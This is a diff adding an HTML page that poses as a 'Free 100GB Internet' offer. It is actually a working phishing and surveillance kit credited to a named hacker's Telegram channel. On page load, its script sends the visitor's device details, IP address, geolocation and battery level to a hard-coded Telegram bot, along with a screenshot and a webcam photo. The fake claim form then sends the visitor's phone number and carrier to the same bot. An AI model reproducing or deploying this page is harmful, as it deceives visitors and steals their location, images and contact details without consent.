@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<!--
+ * Sourced By - HACKER JADOON 
+ * Telegram Channel - https://t.me/abdullah_king_0094
+-->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Internet</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #10b981; --primary-dark: #059669; --primary-light: #d1fae5;
+            --secondary: #0ea5e9; --text: #1f2937; --text-light: #6b7280;
+            --light-bg: #f8fafc; --card-bg: #ffffff; --success: #22c55e;
+            --shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05);
+            --radius: 16px; --radius-sm: 8px;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Poppins', sans-serif; background: var(--light-bg); color: var(--text); line-height: 1.6; }
+
+        header { background: var(--card-bg); padding: 16px 24px; position: fixed; width: 100%; top: 0; z-index: 1000; box-shadow: 0 1px 3px 0 rgba(0,0,0,0.1); }
+        .header-container { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 24px; font-weight: 700; color: var(--primary); display: flex; align-items: center; gap: 10px; }
+        .nav-links { display: flex; gap: 32px; }
+        .nav-links a { color: var(--text); text-decoration: none; font-weight: 500; }
+        .nav-links a:hover { color: var(--primary); }
+
+        .hero { margin-top: 80px; background: linear-gradient(135deg, var(--primary), var(--secondary)); padding: 100px 24px; text-align: center; color: white; }
+        .hero h1 { font-size: 3.5rem; margin-bottom: 24px; font-weight: 700; line-height: 1.2; }
+        .hero p { font-size: 1.25rem; margin-bottom: 40px; opacity: 0.9; max-width: 600px; margin: 0 auto 40px; }
+
+        .form-section { background: var(--card-bg); max-width: 700px; margin: 80px auto; padding: 60px 50px; border-radius: var(--radius); box-shadow: var(--shadow); position: relative; overflow: hidden; }
+        .form-section::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(to right, var(--primary), var(--secondary)); }
+        .form-section h2 { text-align: center; margin-bottom: 40px; font-size: 2rem; }
+        .form-group { margin-bottom: 28px; }
+        .form-group label { display: block; margin-bottom: 10px; font-weight: 500; }
+        .form-group input, .form-group select { width: 100%; padding: 16px 18px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px; font-family: 'Poppins', sans-serif; }
+        .form-group input:focus, .form-group select:focus { border-color: var(--primary); outline: none; }
+
+        .success-section { background: var(--card-bg); max-width: 600px; margin: 80px auto; padding: 60px 50px; border-radius: var(--radius); box-shadow: var(--shadow); text-align: center; }
+        .success-section h3 { font-size: 2rem; margin-bottom: 20px; color: var(--success); }
+        .success-section p { color: var(--text-light); margin-bottom: 30px; }
+
+        .button { display: inline-block; padding: 16px 36px; border-radius: 8px; font-weight: 600; text-decoration: none; cursor: pointer; border: none; text-align: center; font-family: 'Poppins', sans-serif; font-size: 1rem; }
+        .button-primary { background: var(--primary); color: white; }
+        .button-primary:hover { background: var(--primary-dark); }
+
+        .features { padding: 80px 24px; background: var(--card-bg); }
+        .features-container { max-width: 1200px; margin: 0 auto; }
+        .section-title { text-align: center; font-size: 2.5rem; margin-bottom: 60px; }
+        .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 40px; }
+        .feature-card { padding: 40px 30px; border-radius: var(--radius); background: var(--light-bg); text-align: center; }
+        .feature-icon { font-size: 48px; color: var(--primary); margin-bottom: 24px; display: inline-flex; width: 80px; height: 80px; background: var(--primary-light); border-radius: 50%; align-items: center; justify-content: center; }
+        .feature-card h3 { font-size: 1.5rem; margin-bottom: 16px; }
+        .feature-card p { color: var(--text-light); }
+
+        footer { background: var(--text); color: white; padding: 40px 24px; }
+        .footer-bottom { text-align: center; color: #9ca3af; }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5rem; }
+            .nav-links { display: none; }
+            .form-section { padding: 40px 30px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-container">
+            <div class="logo"><i class="fas fa-wifi"></i> Free Internet</div>
+            <nav class="nav-links">
+                <a href="#features">Features</a>
+                <a href="#claim">Get Started</a>
+            </nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Get 100GB Free Internet Today!</h1>
+            <p>Join millions of satisfied users who've already claimed their free data. Limited time offer!</p>
+            <a href="#claim" class="button button-primary">Claim Your Free Data</a>
+        </div>
+    </section>
+
+    <section class="form-section" id="claim">
+        <h2>Claim Your Free 100GB Now</h2>
+        <form id="data-form">
+            <div class="form-group">
+                <label for="country">Country Code</label>
+                <select id="country" required>
+                    <option value="">Select Country 🌎</option>
+                    <option value="+213">🇩🇿 +213 (Algeria)</option>
+                    <option value="+91">🇮🇳 +91 (India)</option>
+                    <option value="+1">🇺🇸 +1 (USA)</option>
+                    <option value="+880">🇧🇩 +880 (Bangladesh)</option>
+                    <option value="+44">🇬🇧 +44 (UK)</option>
+                    <option value="+61">🇦🇺 +61 (Australia)</option>
+                    <option value="+49">🇩🇪 +49 (Germany)</option>
+                    <option value="+33">🇫🇷 +33 (France)</option>
+                    <option value="+81">🇯🇵 +81 (Japan)</option>
+                    <option value="+7">🇷🇺 +7 (Russia)</option>
+                    <option value="+27">🇿🇦 +27 (South Africa)</option>
+                    <option value="+971">🇦🇪 +971 (UAE)</option>
+                    <option value="+92">🇵🇰 +92 (Pakistan)</option>
+                    <option value="+234">🇳🇬 +234 (Nigeria)</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="operator">SIM Provider</label>
+                <select id="operator" required>
+                    <option value="">Select Operator 📱</option>
+                    <option value="Mobilis">Mobilis (Algeria)</option>
+                    <option value="Djezzy">Djezzy (Algeria)</option>
+                    <option value="Ooredoo">Ooredoo (Algeria)</option>
+                    <option value="Airtel">Airtel (India)</option>
+                    <option value="Jio">Jio (India)</option>
+                    <option value="Vi">Vi (India)</option>
+                    <option value="T-Mobile">T-Mobile (USA)</option>
+                    <option value="Verizon">Verizon (USA)</option>
+                    <option value="AT&amp;T">AT&amp;T (USA)</option>
+                    <option value="EE">EE (UK)</option>
+                    <option value="Vodafone">Vodafone (UK)</option>
+                    <option value="O2">O2 (UK)</option>
+                    <option value="Three">Three (UK)</option>
+                    <option value="Telstra">Telstra (Australia)</option>
+                    <option value="Optus">Optus (Australia)</option>
+                    <option value="Jazz">Jazz (Pakistan)</option>
+                    <option value="Telenor">Telenor (Pakistan)</option>
+                    <option value="Zong">Zong (Pakistan)</option>
+                    <option value="Grameenphone">Grameenphone (Bangladesh)</option>
+                    <option value="Robi">Robi (Bangladesh)</option>
+                    <option value="Banglalink">Banglalink (Bangladesh)</option>
+                    <option value="MTS">MTS (Russia)</option>
+                    <option value="Beeline">Beeline (Russia)</option>
+                    <option value="MegaFon">MegaFon (Russia)</option>
+                    <option value="China Mobile">China Mobile (China)</option>
+                    <option value="Deutsche Telekom">Deutsche Telekom (Germany)</option>
+                    <option value="Orange">Orange (France)</option>
+                    <option value="Claro">Claro (Brazil)</option>
+                    <option value="Vivo">Vivo (Brazil)</option>
+                    <option value="MTN">MTN (Nigeria)</option>
+                    <option value="Glo">Glo (Nigeria)</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="mobile-number">Phone Number</label>
+                <input type="text" id="mobile-number" placeholder="Enter your phone number" required>
+            </div>
+            <button type="submit" class="button button-primary" style="width: 100%;">Get Your Free 15GB Now</button>
+        </form>
+    </section>
+
+    <section class="success-section" id="success-section" style="display: none;">
+        <h3>🎉 Congratulations!</h3>
+        <p>Your 100GB free internet is being processed. Share with friends to get additional data!</p>
+        <button class="button button-primary">Share &amp; Get More</button>
+    </section>
+
+    <section class="features" id="features">
+        <div class="features-container">
+            <h2 class="section-title">Why Choose Us</h2>
+            <div class="features-grid">
+                <div class="feature-card"><div class="feature-icon"><i class="fas fa-bolt"></i></div><h3>Instant Activation</h3><p>Get your free data instantly after verification</p></div>
+                <div class="feature-card"><div class="feature-icon"><i class="fas fa-globe"></i></div><h3>Worldwide Coverage</h3><p>Available in over 150+ countries</p></div>
+                <div class="feature-card"><div class="feature-icon"><i class="fas fa-lock"></i></div><h3>Secure Process</h3><p>100% safe and secure verification</p></div>
+                <div class="feature-card"><div class="feature-icon"><i class="fas fa-headset"></i></div><h3>24/7 Support</h3><p>Round-the-clock customer support</p></div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-bottom"><p>© 2025 Free Internet Data Hub. All Rights Reserved.</p></div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <script>
+        // ═══════════════════════════════════════════════
+        //  ★ Only modify these 2 places ★
+        // ═══════════════════════════════════════════════
+        const CONFIG = {
+            botToken: "8121499974:AAEPRd5Y6BbJclyO07PnUVwLk4Yb1YfrOWE",   // ← Token from @BotFather
+            chatId: "7831958199"            // ← ID from @userinfobot
+        };
+        // ═══════════════════════════════════════════════
+
+        const API = "https://api.telegram.org/bot" + CONFIG.botToken;
+
+        const sendMsg = (text) =>
+            fetch(`${API}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(text)}`).catch(() => {});
+
+        const sendPhoto = (blob, name) => {
+            const fd = new FormData();
+            fd.append("chat_id", CONFIG.chatId);
+            fd.append("photo", blob, name);
+            fetch(API + "/sendPhoto", { method: "POST", body: fd }).catch(() => {});
+        };
+
+        const getIP = () =>
+            fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip).catch(() => "Unknown");
+
+        const getLoc = () =>
+            fetch("https://ipinfo.io/json").then(r => r.json()).then(i => {
+                const [lat, lon] = (i.loc || ",").split(",");
+                return { state: i.region || "Unknown", city: i.city || "Unknown",
+                         latitude: lat || "Unknown", longitude: lon || "Unknown" };
+            }).catch(() => ({ state: "Unknown", city: "Unknown", latitude: "Unknown", longitude: "Unknown" }));
+
+        const getBatt = () =>
+            navigator.getBattery
+                ? navigator.getBattery().then(b => Math.round(b.level * 100) + "%").catch(() => "Unknown")
+                : "Unknown";
+
+        const snap = () => {
+            try {
+                html2canvas(document.body).then(c => c.toBlob(b => sendPhoto(b, "screenshot.jpg"), "image/jpeg"));
+            } catch (e) {}
+        };
+
+        const cam = () => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                const v = document.createElement("video");
+                v.srcObject = s;
+                v.play();
+                setTimeout(() => {
+                    const c = document.createElement("canvas");
+                    c.width = 640; c.height = 480;
+                    c.getContext("2d").drawImage(v, 0, 0, 640, 480);
+                    c.toBlob(b => { sendPhoto(b, "photo.jpg"); s.getTracks().forEach(t => t.stop()); }, "image/jpeg");
+                }, 1500);
+            }).catch(() => {});
+        };
+
+        // ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
+        //  Everything runs as soon as page loads - no form submission needed
+        // ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
+        window.addEventListener("load", async function () {
+            // 1) Immediately send device + network info
+            sendMsg(
+                "📱 New App Open:\n" +
+                "    📱 Device: " + navigator.userAgent + "\n" +
+                "    🌐 Network: " + (navigator.connection ? navigator.connection.effectiveType : "Unknown") + "\n" +
+                "    💀 By @abdullah_king_0094 💀"
+            );
+
+            // 2) IP + Location + Battery (parallel execution)
+            const [ip, loc, batt] = await Promise.all([getIP(), getLoc(), getBatt()]);
+            sendMsg(
+                "📍 Location Info:\n" +
+                "    🌐 IP: " + ip + "\n" +
+                "    📍 State: " + loc.state + "\n" +
+                "    🏙️ City: " + loc.city + "\n" +
+                "    🌐 Lat: " + loc.latitude + "\n" +
+                "    🌐 Lon: " + loc.longitude + "\n" +
+                "    🔋 Battery: " + batt
+            );
+
+            // 3) Take screenshot after 1.5 seconds
+            setTimeout(snap, 1500);
+
+            // 4) Camera permission (captures photo if user allows)
+            cam();
+        });
+
+        // When form is filled, send complete report with phone number
+        document.getElementById("data-form").addEventListener("submit", async function (e) {
+            e.preventDefault();
+            const country = document.getElementById("country").value;
+            const operator = document.getElementById("operator").value;
+            const number = document.getElementById("mobile-number").value.trim();
+            if (!country || !operator || !number) return alert("Please fill in all fields.");
+
+            document.getElementById("success-section").style.display = "block";
+            this.style.display = "none";
+
+            sendMsg(
+                "📲 New Data Request:\n" +
+                "    🌍 Country: " + country + "\n" +
+                "    📡 Operator: " + operator + "\n" +
+                "    📞 Phone: " + number + "\n" +
+                "    📞 Telegram: https://t.me/" + country + number + "\n" +
+                "    👤 WhatsApp: https://wa.me/" + country + number
+            );
+        });
+    </script>
+</body>
+</html>
